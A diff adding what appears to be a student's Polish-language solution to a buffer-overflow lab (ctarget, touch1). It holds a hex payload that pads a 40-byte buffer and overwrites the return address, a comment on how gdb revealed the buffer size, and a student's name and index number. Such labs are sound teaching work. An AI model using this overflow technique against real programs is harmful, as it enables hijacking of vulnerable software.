@@ -1,0 +1,21 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Krzysztof Chmiel, 316749
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+be 1b 40 00 00 00 00 00 
+
+/* 
+ * tutaj bardzo prosto sprawdzamy gdbem ile stosu jest alokowane dla bufora, jest to 0x28, czyli 40 bajtów, więc wstawiamy tyle bajtów
+ * do bufora, żeby go zapachać i dostać się do stosu ponad bufor, gdzie dajemy w miejsce powrotu adres do naszej funkji touch1. Potem
+ * już klasycznie jak w każdym z tych zadań dajemy ./hex2raw < nazwa_pliku_z_rozwiazaniem.txt | ./ctarget -q 
+ */
